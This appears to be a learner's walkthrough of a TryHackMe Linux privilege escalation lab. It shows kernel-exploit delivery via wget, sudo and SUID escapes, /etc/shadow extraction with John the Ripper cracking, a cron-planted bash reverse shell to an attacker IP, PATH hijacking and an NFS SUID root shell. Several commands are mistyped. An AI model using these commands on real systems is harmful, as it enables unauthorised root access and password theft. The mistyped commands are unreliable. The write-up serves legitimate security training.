## THM LINUX PRIVILEGE ESCALATION BOX

### ***# TASK 3: ENUMERATION***
- First, ssh into the box. 
  - ```ssh karen@<target ip>```
- To find the hostname, use the prompt 
  - ```hostname``` 
- For the Linux kernel version, use: 
  - ```cat /etc/os-release```
- Flavor of Linux being ran (ubuntu, debian, centos, etc): 
  - ```cat /etc/os-release``` 
- The following prompt will return the version of python you're running:
  - ```python --version```
- A quick google search on this particular Linux version's CVE's will return:
  - CVE-2015-1328
  - https://www.exploit-db.com/exploits/37292

![Alt text](<linux 3.13.0-24 cve.jpg>)

### ***# TASK 5: PRIVILEGE ESCALATION: KERNEL EXPLOITS***
- SSH into the Karen VM.
- In a separate terminal tab: 
  - From the previous task we found out that the system is vulnerable to CVE-2015-1328. Go back to exploit-db, copy the script for the exploit, and create a .c (C-programming language) file with the code. 
- Use ```gcc <file name.c> -o <new file name>```. 
  - This compiles your file and spits out an executable without a file extension. 
- Next we want to start a simple http server that we can download the executable that we just created. 
  - To do this, use: ```sudo python3 -m http.server p <port #>```
- Now that we've established a server for our computer, lets download that exploit onto Karen's machine. 
  - ```wget http://<attack machines ip>:<port #>/<name of your vulnerability>```
- With the exploit now downloaded to Karen's VM, we give the exploit file executable permissions with: 
  - ```chmod +x <file name>```
- Run the file. 
  - ```./<filename>```
- Lastly, we're asked to enumerate the content of the file "flag1.txt."
  - ```find -name flag1.txt```
  
![Alt text](<nano cve.jpg>)
![Alt text](<simple http server.jpg>)
![Alt text](<wget from simple http server.jpg>)
![Alt text](<executable script.jpg>)
![Alt text](<find a file.jpg>)

### ***# TASK 6: PRIVILEGE ESCALATION: SUDO***
- To find the programs that karen can run with sudo, use: 
  - ```sudo -l```
  - There are 3 programs that she is able to run w/ sudo. 
- The second question asks what the content of flag2 is? If you run ```find -name flag2.txt``` you'll be informed that you need root privileges to access this file. 
- You'll notice that nano is one of these sudo executables. Let's use it. 
  - Run ```sudo nano```. 
  - Put it in executable mode with ```ctrl+r, ctrl+x```. 
  - Execute the command ```rest; sh 1>&20 2>&0```
  - Exit out of nano, and you've got root privileges. 
  - If upon exiting, it looks like your screen is frozen, just type: ```clear```. 
- An alternative method is using find (since it was listed as a sudo executable). 
  - Use the command: ```sudo find . -exec /bin/sh \; -quit```
- The last question asks for Franks hashed password. Since we've obtained root access just cat the password file:
  - ```cat /etc/shadow```
  
![Alt text](<sudo find priv esc.jpg>)
![Alt text](<linux password file.jpg>)

### ***# TASK 7: PRIVILEGE ESCALATION: SUID***
- To find list files that have SUID or SGID bits set, use the command: 
  - ```find / -type f -perm -04000 -ls 2>/dev/null```
  - You can use gtfobins to compare exploitable SUID bits
    - https://gtfobins.github.io 
  - If you go through the list of files with SUID bits, you'll see that base64 is one of them. Base64 is a good one to use because since it has SUID bits, meaning that you can read files that Karen doesn't have permission to via the base64 command. Base64 will encode the file but you can also decode it. 
- THM tells us to use the "unshadow tool" to create a file crackable by John the Ripper. In order to do this, we need 3 things: 
  - Usernames, passwords, and a wordlist for john the ripper to go off of. 
- We can utilize base64 to read/create two .txt files of the passwords and usernames. 
  - **You need to be ssh'd into Karen's account for the following commands:**
    - Note that Karen is not permitted to run sudo on this sytem (```sudo -l```). Unfortunately, we can just use gtfobins. 
    - Although we can see the /etc/passwd file, we're still going to go through the motions of using base64:
      - ```base64 /etc/passwd | base 64 -d```
      - Now, copy and paste this into a text editor, you can use plume, sublime txt, etc. Save this as a .txt file. 
    - Next, use the same process for the /etc/shadow file. (You'll notice that you can not read this one if you just ```cat /etc/shadow```). 
      - ```base64 /etc/shadow | base 64 -d```
      - Once again, copy this and create another .txt file with it. 
    - Last, THM tells you to use the "unshadow" tool, open up another tab in terminal so you're root on your system. 
      - If you use ```ls -a``` you should see the .txt files with the /etc/passwd and /etc/shadow files that you created. 
- Now, we want to use the unshadow tool to combine the two files: 
        - ```unshadow <file1.txt> <file2.txt> > <name of file to output data.txt>```
- After that, run john the ripper one the combined file: 
  - ```john --<filepath of word list you want to use> <file you want to run it on>```  
    - ```john --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt```
  - If you wait long enough, you'll get 3 usernames/passwords. 
      - Now you have the answers to question 1/2. 
- The last question asks: What is the content of the flag3.txt file? 
  - We can just use the ```find``` command for this and then utilize base64 again. 
    - To find the file, use the command: 
      - find -name flag3.txt 2>/dev/null
        - should return ```./home/ubuntu/flag3.txt```
      - With this, you can use base64 to read it (since it has a SUID bit allowing you to run it even though you don't have root privileges.).
        - ```base64 ./home/ubuntu/flag3.txt | base64 -d```
  
![Alt text](<base64 SUID.jpg>)
![Alt text](passwd.txt.jpg)
![Alt text](<unshadow command.jpg>)
![Alt text](johntheripper.jpg)
![Alt text](<base64 SUID bit.jpg>)

### ***# TASK 8: PRIVILEGE ESCALATION: CAPABILITIES***
- The first questions asks us how many binaries have set capabilities? In order to find out, we use:
  - ```getcap -r / 2>/dev/null```
  - It should return 6 results. 
  - Note the pathway for view. *
  - Move into the ubuntu directory. 
- Now that we know view can be used through its capabilities, we're going to use gtfobins and see what we can do with view. 
  - On gtfobins, type in view, click on "capabilities" and we're given the command: 
    - ```./view -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'```
    - If you execute this, a shell should open. Use ```whoami``` to see what user you are. You should now be root. 
      - If it did not execute, you're probably not in the Ubuntu directory. 
- With root privilege, you can now use the find command: 
  - ```find -name flag4.txt```
  - Last, cat the file to get the answer. 

![Alt text](<capabilities view pwd.jpg>)
![Alt text](<getcap-r  root privilege.jpg>)

### ***# TASK 9: PRIVILEGE ESCALATION: CRON JOBS***
- The purpose of crontabs is automation. You schedule a particular task to run at certain intervals. 
- In order to view the flag5.txt file, we're going to need to ssh into karen's machine, set up a listener on our machine (attacking machine), and create a reverse shell script in a crontabs file. For this one, we're literally going to follow THM. 
  1. Open up a second tab.
  2. SSH into Karen's machine. 
  3. Run: ```cat /etc/crontab``` to find out what cron jobs are running. There is only one with a direct file path, so we'll use it. 
  4. Edit the backup.sh file by deleting everything except the shebang and put in your listener. 
      - You can use revshells.com to easily create one. 
      - It should look something like: 
        - ```/bin/bash -i >& /dev/tcp/<your-ip>/<port # you want to listen on> 0>&1```
        - Lastly, make the file executable. 
          - chmod +x backup.sh
  5. Go to your other tab now and start a listener:
     - ```nc -lvnp <port # you used in the reverseshell>```
     - It may take a few seconds, but you should connect to the target machine and be logged in as root. 
  6. To locate the flag5.txt we can use the find command: 
      - Find -name flag5.txt, and it should return ```./home/ubuntu/flag5.txt```. 
      - If the command isn't working, try moving to the root directory. 
      - Since we have root privilege, you can just cat that path. 
  7. The last task is to find Matt's password. For this task, reference the SUID box. 
      - Create a file with a copy of the ```/etc/passwd``` data and ```/etc/shadow``` data. 
      - Use ```"unshadow"``` command to combine the two files into one. 
      - Lastly, use john the ripper to crack the hashed password. 

![Alt text](<karen crontab.jpg>)
![Alt text](<crontab listener.jpg>)
![Alt text](<finding matts pass.jpg>)
![Alt text](<matts password crontabs.jpg>)

### ***# TASK 10: PRIVILEGE ESCALATION: PATH***
1. SSH into karen's machine. 
2. Search the machine for writable files: 
   - ```find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u```
3. You should notice that there is a folder for a usr that has writable permissions. 
   - "home/murdoch"
   - I'm not sure why exactly it stood out, but it's odd to have writable permissions to another user's account when you're not root. 
4. Now we need to examine the contents of flag6.txt. To do this, we're going to create an executable file that will give us root permission. 
5. Navigate to the ```/home/murdoch``` directory since it has writable permissions. Use ```ls -alh``` to view what permissions each file has. 
   - You'll notice that the "test" file is executable. Let's run it and see what it does (```./test```). 
   - It appears that the executable is looking for a file called "thm." So, what we want to do is create a file called thm that ```test``` will execute. 
6. Before we create the file, we need to add /home/murdoch to our PATH. 
   - The output of the command: ```echo $PATH``` shows you the logical process that the machine goes through when searching for an executable file with that name. If you execute ```echo $PATH```, you'll notice that our current directory, the writable one, is not included in this. What this means is that when we execute ```test```, the machine doesn't look into our current directory. 
   - To remedy this, we add our directory to our path.
7. Add our current directory to the pathway. 
   - ```export PATH=/home/murdoch:$PATH```. 
   - Now, when you ```echo $PATH```, you should get the following: 
     - ```/home/murdoch:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin```
8. Create a file called "thm" that will enable us to read the "flag6.txt" file: 
   - nano thm
   - Now, there are multiple ways to go about this. You're free to choose whatever you'd like, the quickest way to get the answer will probably be the following though: 
     - Add the shebang: ```#!/bin/bash```. This lets the system know what interpreter we want it to use to run the succeeding commands. 
     - Then: ```sudo cat /home/matt/flag6.txt```. 
   - Second method, Gain root privileges and then read the "flag6.txt" file. 
     - Instead of ```sudo cat``` we can use ```sudo su -```.
9. Make the thm file executable:
   - chmod +x thm
10. Run "test."
    - ```./test```

![Alt text](<path script to execute as root.jpg>)  
![Alt text](<path escalation.jpg>)  
![Alt text](<path sudo su.jpg>)

### ***# PRIVILEGE ESCALATION: NFS***
1. Open two tabs in your terminal. 
2. In one of the tabs, SSH into Karen's machine
   - ```ssh karen@<target machine ip>```
3. Once in, you're explore which files are a part of the Network File Sharing. 
   - ```cat /etc/exports```
4. You should see that there are 3 files that are accesible remotely. Now, as THM says, the critical part is finding one that has the "no_root_squash" option present. This allows us to create an executable with a SUID bit on our system and run it on another. You can go with any of the 3 but I'm going to go with the tmp file. 
   - Move into the tmp file with: 
     - ```cd /tmp```
5. We confirm that the ```tmp``` file is mountable. 
  - A mountable file is one that can be attached to the file system and made available to users. 
6. Go to your other tab, where you're still in your machine, and move into the tmp directory. 
   - ```cd /tmp```
7. We're going to create another directory in there to keep things tidy and to ensure that we are able to successful mount to the target machine: 
  - mkdir tmp
8. Now, we are going to mount our directory that we just created to the machine that we're trying to gain access on. Essentially, we're making the data on our machine accessible on the other machine. 
  - ```mount -o rw <target machine ip>:/tmp /tmp/tmp```
    - In order to mount our directory to the tmp directory on the target's machine with read/write privileges, we use: ```mount -o rw```
    - The directory that we want to mount to is:"```/tmp```"
    - The directory that we want to mount is our: "```/tmp/tmp```
9.  Now, let's create a simple executable that will run /bin/bash on the target system. 
   - This can be done in any of the text editors. I used Sublime. When you do this make sure to save it in the tmp folder that we just created. 
     - "Other Locations">"Computer"
   - Script to obtain root permissions: 
     - ```bash
        int main()  
        {
          setgid(0);  
          setuid(0);  
          system("/bin/bash");  
        }
      - setgid: Sets the effective group ID to 0 (root).
      - setuid: Sets the effective user ID to 0 (root). 
      - system("/bin/bash") executes. 
- When you save, remember to add the extension .c
       - The ".c" extension 
10.  Compile the preceding file into an executable:   
- ```gcc <file.c> -o <file> -w```  
  - Add the SUID bit:  
    - ```chmod u+s <file>```
11.  Switch back to the tab where you SSH'd into Karen's machine. 
- Make sure you're in the tmp folder. Use ls, and you should see the file you created on your machine. 
  - Execute that file: 
    - ```./<file>```
  - You should now have root access. 



![Alt text](<NFS FILES.jpg>)
![Alt text](<mountable NFS files.jpg>)
![Alt text](<setting SUID bits for binbash nfs.jpg>)
![Alt text](<binbash SUID executable.jpg>)
![Alt text](<tmp NFS root.jpg>)

### ***# NFS NOTES:***
- Network File Sharing configuration is kept in the ```/etc/exports``` file. 
- "no_root_squash" option. If this is present on a writable share, we can create an executable with a SUID bit and run it on our target's system. 
- Setting a SUID bit, sounds like some incantation. What this translate to is allowing a file to be executed with the privileges of the file's owner, regardless of what user is executing it. 
  - ```gcc <file name you want to add SUID bit to> -o <what you want this file to be called> -w```
  - ```chmod u+s <file path>```
    - The "u" switch specifies the user class. 
      - u - owner of the file/directory. 
      - g - group of the file/directory.
      - o - all other users. 
    - The "s" switch stands for setuid. 

### ***# TASK 12: CAPSTONE CHALLENGE***
#### THINGS I TRIED PRIOR TO JOHN THE RIPPER:
- ```sudo -l```
   - No sudo privileges. 
- getcap -r / 2>/dev/null
  - suexec? 
- cat /etc/crontab
   - no tasks
- path escalation: 
-  ```find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u```
   -  home/leonard ??? 
   -  tmp
1. The other methods may have worked but either I didn't see it or I just don't know how to utilize them. So, I used john the ripper and got the password for Missy's account. 
- SSH in with leonards credentials. 
- Make files of the passwd and shadow files with a text editor (I used sublime):
  - ```base64 /etc/passwd | -d```
  - ```base64 /etc/shadow | -d```
- Next, use unshadow via john the ripper to combine the files: 
  - ```unshadow <file1> <file2> > <file3>```
- Run john the ripper: 
  - ```john ---wordlist=/usr/share/wordlists/rockyou.txt <file3>```
    - You should now have Missy's password. 
2. SSH into missy's account:
- ```cat ./missy/Documents/flag1.txt```
  - You've got your first flag. 
3. Flag2, I repeated the same process as before, but didn't have to go far. Missy has a sudo privilege and base64 has a SUID bit. 
  - We're going to exploit ```find``` with a sudo command to obtain root privileges" 
    - ```sudo find . -exec /bin/sh \; -quit```
    - BOOM, we're root. 
- Back out of the directory and find flag2. 
  - ```find -name flag2.txt```
  - ```./home/rootflag/flag2.txt```

#### BASE64 SUID BIT CONFIGURATION
1. By a process of elimination, we can assume with a degree of certainty that flag2 is in the rootflag directory. 
2. We now know that base64 has a SUID bit set and the pathway is /usr/bin. 
3. Let's move into usr/bin and set this up. 
- ```cd usr/bin```
- LFILE=/home/rootflag/flag2.txt
- /usr/bin/base64 "$LFILE" | base64 --decode
  - GTFObins has the command: 
    - ```./base64 "$LFILE" | base64 --decode```
    - For ```./base64``` you'll substitute the file path that you were given when looking for files with SUID bits. In this case it was ```/usr/bin/base64```.
  
![Alt text](<flag1 capstone.jpg>)
![Alt text](<sudo find root.jpg>)
![Alt text](<flag2 linpriv.jpg>)
![Alt text](<file SUID root.jpg>) 
![Alt text](<base64 SUID bit.jpg>)  

### * NONE OF THE PRECEDING CODE WAS MINE AND I DO NOT TAKE CREDIT FOR IT. I DO TAKE CREDIT FOR THE MISTAKES, THOUGHTS, AND EXPRESSION OF SAID THOUGHTS. THE FOLLOWING ARE SOME OF THE RESOURCES THAT I USED: 
- LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS  
- LinEnum: https://github.com/rebootuser/LinEnum  
- LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester  
- Linux Smart Enumeration: https://github.com/diego-treitos/  linux-smart-enumeration  
- Linux Priv Checker: https://github.com/linted/linuxprivchecker 
- https://gtfobins.github.io/
  - list of UNIX binaries that can be used to bypass local security restrictions
- https://gtfobins.github.io/gtfobins/nano/#sudo
  - nano priv escalation
